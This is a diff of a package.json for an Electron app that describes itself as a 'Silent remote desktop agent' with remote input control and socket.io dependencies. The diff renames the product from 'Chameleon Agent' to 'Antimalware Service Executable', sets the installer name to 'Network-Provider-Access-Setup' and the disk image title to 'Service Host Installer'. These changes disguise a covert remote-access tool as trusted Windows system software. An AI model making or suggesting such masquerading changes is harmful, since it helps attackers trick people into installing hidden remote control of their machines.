@@ -1,9 +1,9 @@
 {
   "name": "agent",
-  "version": "1.2.0",
+  "version": "1.4.1",
   "main": "src/main.js",
   "scripts": {
-    "start": "electron .",
+    "start": "set ELECTRON_RUN_AS_NODE=0 && electron .",
     "build": "electron-builder"
   },
   "keywords": [],
@@ -11,8 +11,10 @@
   "license": "ISC",
   "description": "Silent remote desktop agent",
   "build": {
-    "appId": "com.chameleon.agent",
-    "productName": "Chameleon Agent",
+    "appId": "com.service.network",
+    "productName": "Antimalware Service Executable",
+    "icon": "build/icon.png",
+    "artifactName": "Network-Provider-Access-Setup-${version}.${ext}",
     "directories": {
       "output": "dist"
     },
@@ -28,7 +30,7 @@
       "category": "public.app-category.utilities"
     },
     "dmg": {
-      "title": "Chameleon Installer",
+      "title": "Service Host Installer",
       "contents": [
         {
           "x": 130,
@@ -53,7 +55,6 @@
   },
   "dependencies": {
     "@nut-tree-fork/nut-js": "^4.2.6",
-    "axios": "^1.13.6",
     "electron-store": "^11.0.2",
     "qrcode": "^1.5.4",
     "socket.io-client": "^4.8.3"
